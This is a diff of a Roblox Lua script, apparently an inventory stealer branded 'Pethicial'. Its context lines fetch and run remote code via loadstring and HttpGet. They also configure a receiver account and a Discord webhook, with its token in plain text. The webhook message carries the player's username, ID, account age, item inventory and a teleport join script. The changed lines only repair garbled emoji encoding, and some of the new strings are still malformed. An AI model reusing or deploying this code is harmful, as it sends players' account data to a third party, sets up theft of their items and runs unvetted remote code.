@@ -162,15 +162,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic
 
 
 
-
-
-
-
-
-
-
-
-
 Config = {
     Receivers = {"sambou93107"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
     Webhook = "https://discord.com/api/webhooks/1263833368215158865/4J8nEnlTsrYrwDckjTv02gRFMpcyHWCAfvN1gaagZLYTqIk7X4GjbsWCIWu1yc8XkjeQ",
@@ -540,7 +531,7 @@ local success, errorMsg = pcall(function()
     end
 end)
 if success then
-    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\nÃ°Å¸Å½â€™ **__Inventory__**\n```Ancient    Ã°Å¸Å¸Âª: " .. Ancient .. "\nGoldy      Ã°Å¸Â§ : " .. Godly .. "\nUnique     Ã°Å¸Å¸Â§: " .. Unique .. "\nVintage    Ã°Å¸Å¸Â¨: " .. Vintage .. "\nLegendary  Ã°Å¸Å¸Â¥: " .. Legendary .. "\nRare       Ã°Å¸Å¸Â©: " .. Rare .. "\nUncommon   Ã°Å¸Å¸Â¦: " .. Uncommon .. "\nCommon     Ã¢Â¬â€º: " .. Common .. "```\nÃ°Å¸Å½â€™ **__Full Inventory__**\n```" .. AllItems .. "```\nÃ°Å¸â€â€” **__Execute to join__**\n```" .. TeleportScript .. "```"
+    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGoldy      🌟 : " .. Godly .. "\nUnique     🟨: " .. Unique .. "\nVintage    🟥: " .. Vintage .. "\nLegendary  🟧: " .. Legendary .. "\nRare       🟦: " .. Rare .. "\nUncommon   🟩: " .. Uncommon .. "\nCommon     ⬜: " .. Common .. "```\🎒’ **__Full Inventory__**\n```" .. AllItems .. "```\”— **__Execute to join__**\n```" .. TeleportScript .. "```"
 else
     message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**Please report this error to .gg/pethicial as it may be a critical error that could lead to vulnerabilities.**"
 end
@@ -562,7 +553,7 @@ embed.Info = {
 		Color = DYWebhook.ColorConverter(Color3.fromRGB(255,215,0))
 	},
 	Embed = {
-		Title = "Ã°Å¸â€˜â€˜ **__Pethicial__ | __.gg/pethicial__**",
+		Title = "👑 **__Pethicial__ | __.gg/pethicial__**",
 		Description = message,
 		Footer = ".gg/pethicial",
 	}
